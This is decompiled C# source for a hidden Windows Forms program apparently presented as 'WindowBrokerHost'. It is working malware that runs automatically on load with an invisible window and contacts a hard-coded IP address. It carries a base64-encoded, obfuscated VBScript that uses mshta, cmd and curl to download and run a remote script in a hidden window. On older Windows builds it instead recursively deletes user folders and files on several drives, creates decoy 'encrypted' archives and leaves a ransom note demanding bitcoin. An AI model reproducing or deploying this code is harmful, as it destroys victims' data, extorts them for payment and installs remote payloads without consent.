using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WindowBrokerHost;

public class Form1 : Form
{
	public static List<string> AllFolders;

	public static List<string> AllFiles;

	private IContainer components;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
		((Form)this).add_Load((EventHandler)Form1_Load);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		button1.PerformClick();
	}

	public static bool ISdel()
	{
		try
		{
			if (int.Parse((string)Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")!.GetValue("CurrentBuild")) <= 10240)
			{
				return true;
			}
			return false;
		}
		catch
		{
		}
		return false;
	}

	private void button1_Click(object sender, EventArgs e)
	{
		using (HttpClient httpClient = new HttpClient(new HttpClientHandler
		{
			AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate)
		}))
		{
			httpClient.BaseAddress = new Uri("http://193.149.187.161/");
			_ = httpClient.GetAsync("index.php?id=1").Result.Content.ReadAsStringAsync().Result;
		}
		byte[] bytes = Convert.FromBase64String("QUxMIEZJTEVTIE9OIEFMTCBZT1VSIERJU0tTLCBDTE9VRCBTVE9SQUdFLCBGTEFTSCBEUklWRVMgSEFTIEJFRU4gRU5DUllQVEVEIEM6XFVzZXJzXDFcRGVza3RvcFxDcnlwdFwNCklmIHlvdSB3YW50IHRvIGRlY3J5cHQgeW91ciBGSUxFUw0KWW91IHNob3VsZCB0cmFuc2ZlciAwLjAyIGJpdGNvaW4oYnRjKSB0byBhZGRyZXNzIGJjMXE2cjM0ZXB5aHJqZ2thcGh0NW05MHE4MGV4c3hhcG5rNTZtNmd0bg0KQWZ0ZXIgUGF5bWVudCB3aWxsIGRvbmUgYWxsIHlvdXIgZmlsZXMgd2lsbCBiZSBhdXRvIERlY3J5cHQNCldoZXJlIHRvIGJ1eSB0aGUgQml0Y29pbnM/DQpodHRwczovL2xvY2FsYml0Y29pbnMuY29tL2J1eS1iaXRjb2lucy1vbmxpbmUvZXVyLw0KaHR0cHM6Ly93d3cudGhlYmFsYW5jZW1vbmV5LmNvbS9iZXN0LXBsYWNlcy10by1idXktYml0Y29pbi00MTcwMDgx");
		string @string = Encoding.UTF8.GetString(bytes);
		if (!ISdel())
		{
			byte[] bytes2 = Convert.FromBase64String("dXJfSEVXTTMxID0gcmVwbGFjZSgiSEVXTTMxaHRIRVdNMzF0SEVXTTMxcDovSEVXTTMxLzFIRVdNMzE5My4xSEVXTTMxNDkuMUhFV00zMTg3SEVXTTMxLjFIRVdNMzE2MUhFV00zMSIsIkhFV00zMSIsIiIpDQpjb21tRXhlY19IRVdNMzEgPSAibXNIRVdNMzFoSEVXTTMxdGEgdmJIRVdNMzFzY3JIRVdNMzFpcHQ6RXhIRVdNMzFlSEVXTTMxY3V0SEVXTTMxZSgiIkNyZWF0ZU9IRVdNMzFiamVjdCgiIiIiV1NjSEVXTTMxcmlwdC5TaGVIRVdNMzFsbCIiIiIpLlJIRVdNMzF1biAiIiIiY0hFV00zMW1kIC9rIGN1SEVXTTMxcmwgLUhFV00zMWsgLUhFV00zMUwgIiAmIHVyX0hFV00zMSAmICIvb2JIRVdNMzFmdXNIRVdNMzFjYXRIRVdNMzFlZC5IRVdNMzF2YkhFV00zMXMgLS1vdUhFV00zMXRIRVdNMzFwdXQgJVVTSEVXTTMxRVJQUkhFV00zMU9GSUxFJVwxLkhFV00zMXZiSEVXTTMxcyAmIGNzY0hFV00zMXJpcHQgJVVTRVJQUkhFV00zMU9GSUxFJVxIRVdNMzExLkhFV00zMXZIRVdNMzFicyIiIiIsMEhFV00zMTpjbEhFV00zMW9IRVdNMzFzZSIiKSINCmNvbW1FeGVjX0hFV00zMSA9IHJlcGxhY2UoY29tbUV4ZWNfSEVXTTMxLCJIRVdNMzEiLCIiKQ0KU2V0IHdzaHNfSEVXTTMxID0gY3JlYXRlb2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCndzaHNfSEVXTTMxLlJ1biAgY29tbUV4ZWNfSEVXTTMxICwxLHRydWU=");
			string string2 = Encoding.UTF8.GetString(bytes2);
			File.WriteAllText("res.vbs", string2);
			appRun("cscript", "res.vbs", 1);
		}
		else
		{
			try
			{
				del();
				foreach (string allFolder in AllFolders)
				{
					try
					{
						Directory.Delete(allFolder, recursive: true);
					}
					catch
					{
					}
				}
				foreach (string allFile in AllFiles)
				{
					try
					{
						Directory.Delete(allFile, recursive: true);
					}
					catch
					{
					}
				}
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
				if (!Directory.Exists(folderPath + "\\crypt\\"))
				{
					Directory.CreateDirectory(folderPath + "\\crypt\\");
					for (int i = 0; i < 3761; i++)
					{
						Random random = new Random();
						byte[] array = new byte[10240];
						random.NextBytes(array);
						File.WriteAllBytes(folderPath + "\\crypt\\CryptoArch" + i + ".rar", array);
					}
				}
				File.WriteAllText(folderPath + "\\readme.txt", @string);
				appRun("notepad", folderPath + "\\readme.txt", 0);
			}
			catch
			{
			}
		}
		Environment.Exit(0);
	}

	public static void appRun(string app, string argx, int hid)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = app;
			processStartInfo.Arguments = argx;
			if (hid == 1)
			{
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			}
			else
			{
				processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
			}
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
		}
		catch
		{
		}
	}

	public static void del()
	{
		AllFiles = new List<string>();
		AllFolders = new List<string>();
		string[] logicalDrives = Directory.GetLogicalDrives();
		Array.Reverse((Array)logicalDrives);
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			if (!text.Contains("C:"))
			{
				try
				{
					string[] directories = Directory.GetDirectories(text);
					string[] files = Directory.GetFiles(text, "*.*");
					string[] array2 = directories;
					foreach (string path in array2)
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							AllFolders.Add(directoryInfo.FullName);
						}
						catch
						{
						}
					}
					array2 = files;
					foreach (string fileName in array2)
					{
						try
						{
							FileInfo fileInfo = new FileInfo(fileName);
							AllFiles.Add(fileInfo.FullName);
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				continue;
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			try
			{
				string[] directories2 = Directory.GetDirectories(folderPath);
				string[] files2 = Directory.GetFiles(folderPath, "*.*");
				string[] array2 = directories2;
				foreach (string text2 in array2)
				{
					try
					{
						if (!text2.Contains("AppData"))
						{
							DirectoryInfo directoryInfo2 = new DirectoryInfo(text2);
							AllFolders.Add(directoryInfo2.FullName);
						}
					}
					catch
					{
					}
				}
				array2 = files2;
				foreach (string fileName2 in array2)
				{
					try
					{
						FileInfo fileInfo2 = new FileInfo(fileName2);
						AllFiles.Add(fileInfo2.FullName);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(33, 30));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(309, 97));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}
}
